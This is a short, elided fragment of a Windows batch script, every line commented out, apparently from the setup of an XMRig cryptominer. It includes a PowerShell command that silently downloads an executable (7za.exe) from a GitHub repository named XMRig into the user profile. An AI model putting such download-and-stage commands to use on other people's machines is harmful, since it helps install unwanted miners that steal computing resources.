...
REM :REMOVE_DIR1
 ...
 REM if errorlevel 1 (
  ...
  REM powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/Abados-tm/XMRig/main/7za.exe', '%USERPROFILE%\7za.exe')"
  REM if errorlevel 1 (
